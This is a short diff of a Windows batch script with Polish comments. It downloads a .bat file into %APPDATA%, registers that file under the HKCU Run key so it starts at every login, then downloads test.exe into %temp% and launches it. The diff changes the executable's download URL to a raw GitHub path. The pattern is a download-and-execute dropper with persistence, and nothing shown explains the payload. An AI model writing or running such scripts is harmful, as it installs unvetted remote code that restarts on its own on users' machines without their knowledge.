@@ -17,7 +17,7 @@ curl -o "%APPDATA%\czesc_3.bat" -L "https://raw.githubusercontent.com/matisio3/R
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v StartScript /t REG_SZ /d "%APPDATA%\czesc_3.bat" /f
 
 rem Pobranie pliku test.exe do katalogu tymczasowego %temp%
-curl -L -o "%temp%\test.exe" https://github.com/matisio3/rozne-pliki/releases/download/test/test.exe
+curl -L -o "%temp%\test.exe" https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/test.exe
 
 rem Uruchomienie pobranego pliku test.exe z katalogu %temp%
 start "" "%temp%\test.exe"
